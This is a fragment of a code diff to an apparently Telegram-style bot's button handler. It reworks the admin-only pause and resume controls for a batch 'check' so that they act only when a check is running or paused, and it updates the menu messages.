+                await edit_menu(m, "ℹ️ No active check running.", [[("⬅️ Back", "menu", "danger")]])
             return
 
         if data == "pausecheck":
             if not is_admin(uid, uname_btn):
                 return
             with USER_LOCK:
-                PAUSE_REQUEST[uid] = True
-            try:
-                await q.answer("⏸️ Pausing...", show_alert=False)
-            except:
-                pass
-            await edit_menu(m, "⏸️ Paused - Check will pause after current batch\n\nResume or Stop", [[("Resume", "resumecheck", "success"), ("Stop", "stopcheck", "danger")]])
+                if USER_LAST_CHECK.get(f"busy_{uid}"):
+                    PAUSE_REQUEST[uid] = True
+                    await edit_menu(m, "⏸️ <b>Pausing...</b>\n<i>Check will pause after current batch</i>\n\n▶️ Resume or 🛑 Stop", [[("▶️ Resume", "resumecheck", "success"), ("🛑 Stop", "stopcheck", "danger")]])
+                else:
+                    await edit_menu(m, "ℹ️ No active check to pause.", [[("⬅️ Back", "menu", "danger")]])
             return
 
         if data == "resumecheck":
             if not is_admin(uid, uname_btn):
                 return
-            with USER_LOCK:
+            if PAUSE_REQUEST.get(uid):
                 PAUSE_REQUEST.pop(uid, None)
-            try:
-                await q.answer("▶️ Resumed", show_alert=False)
-            except:
-                pass
-            await edit_menu(m, "▶️ Resumed - check continuing...", [[("Stop", "stopcheck", "danger"), ("Pause", "pausecheck", "primary")]])
+                await edit_menu(m, "▶️ <b>Resumed</b> — check continuing...", [[("🛑 Stop", "stopcheck", "danger")]])
+            else:
+                await edit_menu(m, "ℹ️ No paused check.", [[("⬅️ Back", "menu", "danger")]])
             return
 
         if data == "menu":
